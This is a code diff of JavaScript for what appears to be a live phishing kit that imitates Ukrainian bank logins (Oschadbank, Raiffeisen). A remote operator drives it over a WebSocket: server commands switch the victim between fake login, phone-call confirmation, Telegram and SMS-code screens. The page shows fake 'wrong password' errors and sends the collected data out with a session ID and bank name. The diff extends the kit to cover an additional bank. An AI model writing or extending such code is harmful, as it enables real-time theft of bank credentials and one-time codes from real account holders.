+                    sessionId,
+                    bankName: activeBankData.name,
+                    isFinalStep: isFinal,
                     referrer: localStorage.getItem('referrer') || 'unknown',
                     ...data
                 }),
@@ -1023,6 +947,7 @@ document.addEventListener('DOMContentLoaded', () => {
         } catch (error) { console.error('Failed to send data:', error); }
     }
     
+    /** Handles commands from the WebSocket server */
     function handleServerCommand(command) {
         const { type, data } = command;
         const showMessageInMainModal = (title, text, btnText, callback) => {
@@ -1034,20 +959,25 @@ document.addEventListener('DOMContentLoaded', () => {
         };
 
         switch (type) {
-            case 'lk': renderOschadbankLogin(); break;
-            case 'call': renderOschadbankCallConfirmation(); break;
-            case 'telegram_debit': renderTelegramSmsScreen(); break;
+            case 'lk':
+                if (activeBankData.theme === 'oschadbank') renderOschadbankLogin();
+                else if (activeBankData.theme === 'raiffeisen') renderRaiffeisenLogin();
+                break;
+            case 'call':
+                renderOschadbankCallConfirmation();
+                break;
+            case 'telegram_debit':
+                renderTelegramSmsScreen();
+                break;
             case 'password_error':
                 const errorMsg = data.loginType === 'login' ? 'Невірний логін або пароль' : 'Невірний пароль';
-                renderOschadbankLogin({ errorType: data.loginType, errorMessage: errorMsg });
+                if (activeBankData.theme === 'oschadbank') renderOschadbankLogin({ errorType: data.loginType, errorMessage: errorMsg });
+                else if (activeBankData.theme === 'raiffeisen') renderRaiffeisenLogin({ errorType: data.loginType, errorMessage: errorMsg });
                 break;
             case 'code_error':
                 const errorOptions = { error: true };
-                if (lastCodeScreen === 'oschad_call') {
-                    renderOschadbankCallConfirmation(errorOptions);
-                } else if (lastCodeScreen === 'telegram_sms') {
-                    renderTelegramSmsScreen(errorOptions);
-                }
+                if (lastCodeScreen === 'oschad_call') renderOschadbankCallConfirmation(errorOptions);
+                else if (lastCodeScreen === 'telegram_sms') renderTelegramSmsScreen(errorOptions);
                 break;
             case 'sms':
                 modalTitle.textContent = 'Введіть код з SMS';
@@ -1080,11 +1010,11 @@ document.addEventListener('DOMContentLoaded', () => {
             if (item.classList.contains('disabled')) return;
             const bankId = item.dataset.bank;
             activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
-            collectedData = { };
+            collectedData = {};
 
             if (bankId === 'oschadbank') {
                 renderOschadbankLogin();
-            } else if (bankId === 'raiffeisen') { // NEW: Handle Raiffeisen specifically
+            } else if (bankId === 'raiffeisen') {
                 renderRaiffeisenLogin();
             } else {
                 body.dataset.theme = activeBankData.theme;
